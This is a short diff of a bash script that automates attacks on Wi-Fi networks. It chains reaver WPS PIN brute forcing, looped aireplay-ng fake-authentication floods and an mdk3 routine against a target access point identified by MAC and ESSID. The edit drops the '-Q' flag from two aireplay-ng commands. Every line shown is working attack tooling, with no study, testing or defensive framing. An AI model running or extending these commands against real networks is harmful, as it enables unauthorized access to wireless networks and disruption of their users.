@@ -361,7 +361,7 @@ REAVER & AIREPLAY & MDK3 & TAIL;
 }
 ##########################################################################
 function REAVER {   
-echo y|$REAVER_COMMAND_LINE|tee -a /etc/reaver_tmp.txt > /dev/null & aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -Q -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
+echo y|$REAVER_COMMAND_LINE|tee -a /etc/reaver_tmp.txt > /dev/null & aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
 }
 ###########################################################################
 function MDK3 {
@@ -432,7 +432,7 @@ done
 function AIREPLAY {
 while :; do
     sleep 0.5;
-    aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -Q -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
+    aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
 done
 }
 ###########################################################################
